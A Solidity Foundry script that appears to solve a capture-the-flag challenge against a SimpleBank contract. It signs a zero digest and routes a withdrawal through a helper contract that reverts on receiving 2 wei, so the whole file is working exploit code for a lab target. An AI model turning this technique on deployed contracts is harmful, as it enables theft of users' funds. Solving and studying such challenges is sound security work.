// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/ISimpleBank.sol";
import "../src/Challenge.sol";
import { CommonBase } from "forge-std/Base.sol";
import "forge-std/console.sol";

contract Sender {
    function send(ISimpleBank bank, bytes32 d, uint8 v, bytes32 r, bytes32 s) public payable {
        bank.withdraw{value: msg.value}(d, v, r, s);
    }

    receive() external payable {
        if (msg.value == 2) {
            revert();
        }
    }
}

contract Solve is CommonBase {
    Challenge chal;
    uint256 privKey;

    constructor() {
        chal = Challenge(vm.envAddress("CHAL_ADDR"));
        privKey = uint256(vm.envBytes32("PRIV_KEY"));
    }

    function run() public {
        ISimpleBank bank = chal.BANK();
        bytes32 digest = bytes32(0);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(vm.createWallet(privKey), digest);

        vm.startBroadcast(privKey);
        Sender sender = new Sender();
        sender.send{value: 1}(bank, digest, v, r, s);
        vm.stopBroadcast();
        console.log(address(bank).balance);
    }
}
